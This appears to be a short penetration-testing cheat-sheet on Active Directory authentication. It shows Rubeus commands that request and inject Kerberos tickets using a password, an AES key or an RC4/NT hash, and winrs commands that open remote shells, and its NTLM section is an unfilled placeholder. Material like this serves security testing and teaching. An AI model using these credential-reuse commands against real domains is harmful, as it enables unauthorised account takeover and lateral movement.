# AD Authentication

## Kerberos authentication

### Authenticate with a password

Request TGT for a user and inject it:

```powershell
> Rubeus.exe asktgt /user:<username> /pass:<password> /ptt
```

Open a new cmd session in the context of the authenticated user:

```powershell
> Rubeus.exe asktgt /user:<username> /pass:<password> /ptt /createnetonly:C:\Windows\System32\cmd.exe
```

### Authenticate with a key

It is possible sometimes to retrieve an AES-256 or AES-128 key. It is the long-term key that is being used for Kerberos authentication. It is hence possible to use this key to authenticate as the user and get a TGT:

```powershell
> Rubeus.exe asktgt /user:<username> /aes256:<key> /opsec /domain:<domain> /ptt
```

The same is possible with an RC4 key. This is the same as authenticating with a NT hash:

```powershell
> Rubeus.exe asktgt /user:<username> /rc4:<key> /opsec /domain:<domain> /ptt /force
```

## NTLM authentication

XXX



## Tools

### WinRS

This opens a non-interactive session through WinRM. It works as Evil-WinRM on Linux:

```powershell
> winrs -r:server -u:.\local_user -p:<password> cmd
> winrs -r:server -u:domain_user -p:<password> cmd
```
